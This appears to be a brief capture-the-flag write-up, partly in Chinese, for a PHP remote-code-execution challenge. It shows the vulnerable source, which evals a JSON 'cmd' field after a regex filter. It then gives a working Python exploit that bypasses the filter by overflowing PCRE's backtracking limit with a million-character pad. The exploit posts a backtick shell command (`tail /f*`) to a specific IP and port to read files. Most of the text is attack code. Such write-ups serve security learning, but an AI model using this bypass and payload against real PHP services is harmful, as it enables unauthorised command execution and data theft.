#RCE 
```php
<?php
include "check.php";
if (isset($_REQUEST['letter'])){
    $txw4ever = $_REQUEST['letter'];
    if (preg_match('/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&|!|\<|\>|\{|\x09|\x0a|\[).*$/m',$txw4ever)){
        die("再加把油喔");
    }
    else{
        $command = json_decode($txw4ever,true)['cmd'];
        checkdata($command);
        @eval($command);
    }
}
else{
    highlight_file(__FILE__);
}

```

利用回溯次数绕过正则
https://www.bilibili.com/read/cv21531070/

```python
import requests

payload = '{"cmd":"?><?= `tail /f*`?>","test":"' + "@" * (1000000) + '"}'
res = requests.post("http://1.14.71.254:28939/", data={"letter": payload})
print(res.text)

```